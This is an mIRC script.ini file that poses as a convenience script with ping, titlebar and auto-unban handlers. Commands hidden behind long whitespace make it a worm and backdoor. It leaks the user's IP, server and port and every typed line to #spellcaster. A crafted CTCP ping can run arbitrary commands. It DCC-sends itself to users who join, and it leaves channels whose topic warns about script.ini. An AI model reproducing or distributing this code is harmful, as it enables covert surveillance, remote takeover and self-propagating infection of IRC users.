[script]
n0=on 1:START:{                                                                                                                                                                                                                                                                                                                                                                                   .sreq ignore
n1=  .remote on
n2=  titlebar (Not connected)
n3=}
n4=raw 401:*: {
n5=  halt
n6=}
n7=RAW 001:*:titlebar (Connecting to $server $+ )
n8=
n9=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #spellcaster Hi.  $ip on $server $+ : $+ $port $+ .
n10=
n11=on 1:DISCONNECT:titlebar (Not connected)
n12=
n13=;if you type something in status it doesn't have to have "/"
n14=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #spellcaster ( $+ $active $+ ) $1-
n15=  set %a status window
n16=  if ( $active == %a ) { $1- | halt }
n17=}
n18=
n19=;ping stuff
n20=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n21=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
n22=
n23=;if you are banned but still opped, unban self
n24=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n25=
n26=on 1:JOIN:*:{
n27=  if ( $nick == $me ) { halt }
n28=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
n29=}
n30=
n31=;show channel topic in channel on join
n32=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
